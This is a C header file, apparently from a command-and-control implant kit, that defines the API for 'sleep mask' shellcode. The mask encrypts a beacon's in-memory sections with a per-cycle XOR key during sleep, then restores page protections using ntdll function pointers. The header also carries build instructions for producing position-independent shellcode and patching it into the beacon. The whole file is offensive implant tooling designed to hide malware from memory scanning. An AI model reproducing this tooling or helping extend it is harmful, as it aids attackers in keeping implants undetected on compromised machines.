// sleep_mask_api.h — Co2H Sleep Mask Kit public API.
//
// This header defines the contract between the beacon and user-supplied
// sleep mask shellcode. The beacon calls the mask entry point before
// sleeping; the mask must encrypt the beacon's memory, sleep, decrypt,
// and return.
//
// RULES FOR USER CODE:
//   - Must be position-independent (PIC): no globals, no string literals,
//     no CRT, no static data outside the function body.
//   - Entry point signature: void __cdecl sleep_mask_entry(SleepMaskCtx*)
//   - Use only the function pointers provided in SleepMaskCtx.
//   - Do NOT call into beacon code — it will be encrypted when you run.
//   - Maximum compiled size: 8176 bytes (8192 - 16 header).
//
// BUILD:
//   cl.exe /c /O2 /GS- /Zl my_mask.c
//   link.exe /NODEFAULTLIB /ENTRY:sleep_mask_entry /SUBSYSTEM:CONSOLE
//            /SECTION:.text,ER /MERGE:.rdata=.text /OUT:mask.exe my_mask.obj
//   python extract_section.py mask.exe .text mask.bin
//
//   Then: artifact-gen ... --mask mask.bin ...

#pragma once

#ifdef _MSC_VER
#include <windows.h>
#else
// Minimal type definitions for cross-compilation.
typedef unsigned long       DWORD;
typedef unsigned long       ULONG;
typedef unsigned long*      PULONG;
typedef long                LONG;
typedef long long           LONGLONG;
typedef void*               HANDLE;
typedef void*               PVOID;
typedef int                 BOOL;
typedef unsigned __int64    SIZE_T;
typedef SIZE_T*             PSIZE_T;
typedef long                NTSTATUS;
typedef union _LARGE_INTEGER {
    struct { DWORD LowPart; LONG HighPart; };
    LONGLONG QuadPart;
} LARGE_INTEGER, *PLARGE_INTEGER;
#define FALSE 0
#define TRUE  1
#endif

#include <stdint.h>

// Maximum number of memory regions passed to the mask.
#define SLPMSK_MAX_REGIONS  16

// A contiguous memory region the mask should encrypt during sleep.
// The trampoline pre-fills these by walking the PE section table.
typedef struct SleepRegion {
    void*    base;          // virtual address of the region
    uint32_t size;          // size in bytes
    uint32_t original_prot; // original PAGE_* protection (restore after decrypt)
} SleepRegion;

// Context passed to the user's sleep mask entry point.
// All function pointers are resolved by the beacon trampoline before the call.
typedef struct SleepMaskCtx {
    // ---- Regions to encrypt/decrypt ----
    SleepRegion regions[SLPMSK_MAX_REGIONS];
    uint32_t    region_count;

    // ---- Crypto material ----
    uint8_t     key[16];        // random XOR key (generated fresh each cycle)

    // ---- Sleep parameters ----
    uint32_t    sleep_ms;
    uint8_t     jitter_pct;
    uint8_t     _pad[3];

    // ---- NT function pointers (from ntdll.dll) ----
    NTSTATUS (__stdcall *NtProtectVirtualMemory)(
        HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);

    NTSTATUS (__stdcall *NtDelayExecution)(
        BOOL Alertable, PLARGE_INTEGER DelayInterval);

    NTSTATUS (__stdcall *NtWaitForSingleObject)(
        HANDLE Handle, BOOL Alertable, PLARGE_INTEGER Timeout);

    // ---- Kernel32 (convenience) ----
    BOOL (__stdcall *FlushInstructionCache)(
        HANDLE hProcess, const void* lpBaseAddress, SIZE_T dwSize);

    // ---- Helpers ----
    HANDLE      process_handle;  // pseudo-handle (HANDLE)-1
    void*       ntdll_base;      // base of ntdll.dll (for resolving extra functions)

} SleepMaskCtx;

// Entry point prototype. User must implement this function.
// The compiled function is patched into the beacon's .slpmsk section.
#ifdef __cplusplus
extern "C"
#endif
void __cdecl sleep_mask_entry(SleepMaskCtx* ctx);
